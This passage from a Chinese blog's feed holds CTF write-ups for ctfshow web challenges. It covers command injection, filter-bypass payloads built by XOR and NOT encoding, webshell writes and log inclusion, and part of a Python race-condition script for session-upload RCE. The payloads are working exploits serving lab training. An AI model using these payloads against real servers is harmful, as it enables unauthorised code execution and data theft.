132</h1>\n<p>逻辑运算符的优先级判断</p>\n<p>payload: <code>?username=admin&amp;password=1&amp;code=adm3in</code></p>\n<h1 id=\"web-133\"><a class=\"anchor\" href=\"#web-133\">#</a> web 133</h1>\n<h2 id=\"curl-外带\"><a class=\"anchor\" href=\"#curl-外带\">#</a> curl 外带</h2>\n<p>curl</p>\n<h2 id=\"linux-中的-cp-命令\"><a class=\"anchor\" href=\"#linux-中的-cp-命令\">#</a> Linux 中的 cp 命令</h2>\n<p>利用 <code>cp</code>  命令将 flag.php 写入 1.txt，然后访问 1.txt</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?F&#x3D;&#96;$F&#96; ;cp flag.php 1234.txt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&#x2F;1234.txt</pre></td></tr></table></figure><p>注意是反引号，相当于 shell_exec () 函数</p>\n<p>成功原因</p>\n<p>虽然 <code>substr</code>  只取前六位，但在该 payload 中，由于前六位是</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&#96;$F&#96; ;</pre></td></tr></table></figure><p>读入后变量的值会放进去变成</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&#96;&#96;$F&#96; ;cp flag.php 1234.txt&#96;</pre></td></tr></table></figure><h2 id=\"ping\"><a class=\"anchor\" href=\"#ping\">#</a> PING</h2>\n<h1 id=\"web-134\"><a class=\"anchor\" href=\"#web-134\">#</a> web 134</h1>\n<p>观察代码</p>\n<p><code>parse_str</code>  — 将字符串解析成多个变量</p>\n<p><code>extract</code>  — 从数组中将变量导入到当前的符号表 (如果变量已存在，将会覆盖变量)</p>\n<p>由于不能在 POST 里直接传 <code>key1</code>  和 <code>key2</code>  的值，所以可以通过 GET 方式，传入变量名为 <code>_POST</code>  的变量，使得其在之后的 <code>extract</code>  能够覆盖原理啊的 <code>key1</code>  和 <code>key2</code></p>\n<p>payload: <code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p>\n<h1 id=\"web-135\"><a class=\"anchor\" href=\"#web-135\">#</a> web 135</h1>\n<h2 id=\"cp-命令\"><a class=\"anchor\" href=\"#cp-命令\">#</a> cp 命令</h2>\n<h2 id=\"ping-2\"><a class=\"anchor\" href=\"#ping-2\">#</a> ping</h2>\n<h2 id=\"web-136\"><a class=\"anchor\" href=\"#web-136\">#</a> web 136</h2>\n<h2 id=\"tee-命令\"><a class=\"anchor\" href=\"#tee-命令\">#</a> tee 命令</h2>\n<p><code>?c=ls /|tee 1</code></p>\n<p>将 <code>ls /</code>  的回显写入 1 文件</p>\n<p>使用 nl 命令</p>\n<p>之后可以使用同样命令，然后返回即可</p>\n<h2 id=\"修改文件内容\"><a class=\"anchor\" href=\"#修改文件内容\">#</a> 修改文件内容</h2>\n<p><code>?c=ls |xargs sed -i 's/exec/echo/'</code></p>\n<p><code>?c=ls |xargs sed -i 's/exec/system/'</code></p>\n<p>重新访问题目，可以发现字符串匹配下 <code>die</code>  变为 <code>echo</code> ，也就是说，即使满足正则匹配，代码不会结束，会执行后面的代码</p>\n<p>无回显的 <code>exec</code>  变为了 <code>system</code> ，可以输入命令并回显</p>\n<h1 id=\"web-137\"><a class=\"anchor\" href=\"#web-137\">#</a> web 137</h1>\n<p>类静态方法的访问</p>\n<p>POST:  <code>ctfshow=ctfshow::getFLag</code></p>\n<h1 id=\"web-138\"><a class=\"anchor\" href=\"#web-138\">#</a> web 138</h1>\n<p>ban 掉了冒号</p>\n<p>查看文档，找寻访问静态方法的另一种手段</p>\n<p><code>call_user_func</code></p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/static_visit.png\" alt=\"\" /></p>\n<p>也就是说可以通过给 <code>call_user_func</code>  传入一个数组，使其访问</p>\n<p>所以 payload: <code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</code> （该语句意义为给 ctfshow [] 赋两个值）</p>\n<h1 id=\"web-139\"><a class=\"anchor\" href=\"#web-139\">#</a> web 139</h1>\n<p>经过测试，如果想要 <code>intval($code) == 'ctfshow'</code>  为 true</p>\n<p>那么 <code>code</code>  也应该为字符串</p>\n<p>而 <code>$code = eval(&quot;return $f1($f2());&quot;);</code></p>\n<p>所以必须要使函数返回字符串，</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>f1<span class=\"token operator\">=</span>system<span class=\"token operator\">&amp;</span>f2<span class=\"token operator\">=</span>getcwd</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>f1<span class=\"token operator\">=</span>system<span class=\"token operator\">&amp;</span>f2<span class=\"token operator\">=</span>system</pre></td></tr></table></figure><h1 id=\"web-141\"><a class=\"anchor\" href=\"#web-141\">#</a> web 141</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^\\W+$/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span>  <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"return <span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span>;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v3</span></span><span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span> = \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>由判断及正则匹配，知 v1，v2 为数字，v3 为非字母</p>\n<p>测试</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$test</span></span>;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">?</span>test<span class=\"token operator\">=</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><code>phpinfo()</code>  被成功执行，也就是说该写法成立 (相当于以前的 `eval ($c));?c=phpinfo ())</p>\n<p>在上面的语句中，分号已写不用自己补，因此会执行该代码</p>\n<p>而由于题目执行的代码是 <code>$v1$v3$v2</code> , <code>v1</code> ， <code>v2</code>  必为数字，所以可控的字符只有 <code>v3</code> ，并要将其于前后分开</p>\n<p>进行测试</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token operator\">-</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr></table></figure><p>可以执行，所以可以传入 <code>?v1=1&amp;v2=1&amp;v3=</code>  命令进行</p>\n<p>但又因 <code>3</code>  不能出现字母，而大多数函数都有字母，这里采用 <code>16</code>  进制构造的方法构造出命令</p>\n<p>例如</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//system('ls')</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>v1<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v2<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v3<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">^</span><span class=\"token operator\">%</span>f3<span class=\"token operator\">%</span>f9<span class=\"token operator\">%</span>f3<span class=\"token operator\">%</span>f4<span class=\"token operator\">%</span>e5<span class=\"token operator\">%</span>ed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">^</span><span class=\"token operator\">%</span>ec<span class=\"token operator\">%</span>f3<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>   </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//system('tac flag.php')</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>v1<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v2<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v3<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">^</span><span class=\"token operator\">%</span>f3<span class=\"token operator\">%</span>f9<span class=\"token operator\">%</span>f3<span class=\"token operator\">%</span>f4<span class=\"token operator\">%</span>e5<span class=\"token operator\">%</span>ed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">^</span><span class=\"token operator\">%</span>f4<span class=\"token operator\">%</span>e1<span class=\"token operator\">%</span>e3<span class=\"token operator\">%</span>a0<span class=\"token operator\">%</span>e6<span class=\"token operator\">%</span>ec<span class=\"token operator\">%</span>e1<span class=\"token operator\">%</span>e7<span class=\"token operator\">%</span>ae<span class=\"token operator\">%</span>f0<span class=\"token operator\">%</span>e8<span class=\"token operator\">%</span>f0<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span></pre></td></tr></table></figure><h1 id=\"web-142\"><a class=\"anchor\" href=\"#web-142\">#</a> web 142</h1>\n<p>输入小于等于 0 的数字即可</p>\n<h1 id=\"web-143\"><a class=\"anchor\" href=\"#web-143\">#</a> web 143</h1>\n<p>同 141，把减号换成乘号</p>\n<h1 id=\"web-144\"><a class=\"anchor\" href=\"#web-144\">#</a> web 144</h1>\n<p>原理同 141, 调整一下 v2，v3</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>v1<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v2<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">^</span><span class=\"token operator\">%</span>f3<span class=\"token operator\">%</span>f9<span class=\"token operator\">%</span>f3<span class=\"token operator\">%</span>f4<span class=\"token operator\">%</span>e5<span class=\"token operator\">%</span>ed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">^</span><span class=\"token operator\">%</span>f4<span class=\"token operator\">%</span>e1<span class=\"token operator\">%</span>e3<span class=\"token operator\">%</span>a0<span class=\"token operator\">%</span>e6<span class=\"token operator\">%</span>ec<span class=\"token operator\">%</span>e1<span class=\"token operator\">%</span>e7<span class=\"token operator\">%</span>ae<span class=\"token operator\">%</span>f0<span class=\"token operator\">%</span>e8<span class=\"token operator\">%</span>f0<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v3<span class=\"token operator\">=</span><span class=\"token operator\">-</span></pre></td></tr></table></figure><h1 id=\"web-145\"><a class=\"anchor\" href=\"#web-145\">#</a> web 145</h1>\n<p>相同原理</p>\n<p>这里使用取反运算 (或运算不能用，应为如果要用或，那么值一定在 0-128 内，而此时因为绝大部分可用字符被禁，也就是说此时不能构造出满足条件的)</p>\n<p>并使用三元条目运算符  <code>?ex1:ex2</code></p>\n<p><code>?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5):</code></p>\n<p>或者用没有过滤的或运算</p>\n<p><code>?v1=1&amp;v2=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)|</code></p>\n<h1 id=\"web-146\"><a class=\"anchor\" href=\"#web-146\">#</a> web 146</h1>\n<p>同 145 第二种解法</p>\n<h1 id=\"web-147\"><a class=\"anchor\" href=\"#web-147\">#</a> web 147</h1>\n<p><code>if (!preg_match('/^[a-z0-9_]*$/isD', $ctfshow))</code></p>\n<p>不能有数字字母开头</p>\n<p>利用命名空间 <code>\\函数名</code></p>\n<p>首先使用 <code>\\phpinfo</code> , 发现提示用了 2 个函数</p>\n<p>这里可以采用匿名函数，然后传入 <code>show</code>  使其闭合 <code>if</code>  判断，最后注释后面的语句</p>\n<p>payload:</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>show<span class=\"token operator\">=</span><span class=\"token punctuation\">&#125;</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'tac flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">/</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>ctf<span class=\"token operator\">=</span>\\create_function</pre></td></tr></table></figure><h1 id=\"web-148\"><a class=\"anchor\" href=\"#web-148\">#</a> web 148</h1>\n<p>同 141</p>\n<p><strong>或者</strong></p>\n<p>调用函数方法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">get_ctfshow_fl0g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>code <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">%</span><span class=\"token number\">80</span><span class=\"token operator\">^</span><span class=\"token operator\">%</span>e7<span class=\"token operator\">%</span>e5<span class=\"token operator\">%</span>f4<span class=\"token operator\">%</span>df<span class=\"token operator\">%</span>e3<span class=\"token operator\">%</span>f4<span class=\"token operator\">%</span>e6<span class=\"token operator\">%</span>f3<span class=\"token operator\">%</span>e8<span class=\"token operator\">%</span>ef<span class=\"token operator\">%</span>f7<span class=\"token operator\">%</span>df<span class=\"token operator\">%</span>e6<span class=\"token operator\">%</span>ec<span class=\"token operator\">%</span>b0<span class=\"token operator\">%</span>e7<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"web-149\"><a class=\"anchor\" href=\"#web-149\">#</a> web 149</h1>\n<p>覆盖 index.php</p>\n<p>payload：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?ctf=index.php </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>POST:show=<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h1 id=\"web-150\"><a class=\"anchor\" href=\"#web-150\">#</a> web 150</h1>\n<p>日志包含</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>然后利用 ctf 传参，传入日志的路径，使日志被访问</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ctf&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</pre></td></tr></table></figure><p>设置 isVIP 的值为 1，使最下面的 if 条件成立</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?isVIP&#x3D;1</pre></td></tr></table></figure><h1 id=\"web-150-plus\"><a class=\"anchor\" href=\"#web-150-plus\">#</a> web 150-plus</h1>\n<p><code>__autoload()</code> <br />\n 当第一次使用一个类 A 时，如果找不到，会自动调用 <code>__autoload()</code>  方法，并将类名 <code>A</code>  作为参数传入，我们在 <code>__autoload()</code>  中需要的做的就是根据类名，找到相应的文件，并包含进来。</p>\n<p>本题中 <code>class_exists()</code>  类是第一次使用，可以通过对它的使用来调用  <code>autoload ()</code>  这个魔术方法输出变量 <code>$class</code></p>\n<p>过滤掉了 <code>_</code> ，可以通过 <code>…</code>  绕过</p>\n<p>因为题中有 <code>extract</code>  函数，会将传入的数组解析掉，所以 get 传入： <code>?..CTFSHOW…=phpinfo</code></p>\n<p><code>phpinfo()</code>  里面有 flag</p>\n<p>预期解：<strong>条件竞争</strong></p>\n<p><code>ctf=1.php</code></p>\n<p><code>show=&lt;?php system('tac /c*');?&gt;</code></p>\n<p>使用 bp 不断访问并传参，然后开一个去不断访问 1.php</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "url": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "title": "文件包含",
            "date_published": "2022-10-04T14:12:40.000Z",
            "content_html": "<h1 id=\"web-78\"><a class=\"anchor\" href=\"#web-78\">#</a> web 78</h1>\n<p>php 伪协议</p>\n<h1 id=\"web-79\"><a class=\"anchor\" href=\"#web-79\">#</a> web 79</h1>\n<p>data 伪协议 <code>data://text/plain,&lt;?=eval($_POST[1]);?&gt;</code></p>\n<h1 id=\"web-80\"><a class=\"anchor\" href=\"#web-80\">#</a> web 80</h1>\n<p>data 协议被禁用</p>\n<p>可以尝试日志包含</p>\n<p><code>&lt;?php eval($_POST[1]);?&gt;</code></p>\n<h1 id=\"web-82\"><a class=\"anchor\" href=\"#web-82\">#</a> web 82</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#coding=utf-8</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> io</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sessid <span class=\"token operator\">=</span> <span class=\"token string\">'TGAO'</span>          <span class=\"token comment\">#sessionid 值，也为控制的文件名</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"system('whoami');\"</span><span class=\"token punctuation\">&#125;</span>         <span class=\"token comment\">#进行的命令</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 写文件</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        f <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>BytesIO<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">1024</span> <span class=\"token operator\">*</span> <span class=\"token number\">50</span><span class=\"token punctuation\">)</span>      <span class=\"token comment\">#写入的文件内容</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        resp <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span> <span class=\"token string\">'http://127.0.0.1:5555/test56.php'</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'&lt;?php eval($_POST[\"cmd\"]);?>'</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> files<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'tgao.txt'</span><span class=\"token punctuation\">,</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'PHPSESSID'</span><span class=\"token punctuation\">:</span> sessid<span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval ($_POST [\"cmd\"]);?>' 为一句话木马</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\"># files=&#123;'file': ('tgao.txt',f)&#125; 为上传的文件</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token comment\"># cookies=&#123;'PHPSESSID': sessid&#125;，设置 sessid，控制文件名</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># 读文件</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        resp <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://127.0.0.1:5555/test56.php?file=session/sess_'</span><span class=\"token operator\">+</span>sessid<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'tgao.txt'</span> <span class=\"token keyword\">in</span> resp<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            event<span class=\"token punctuation\">.</span>clear<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+++++++++++++]retry\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    event<span class=\"token operator\">=</span>threading<span class=\"token punctuation\">.</span>Event<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">with</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> session<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">xrange</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token 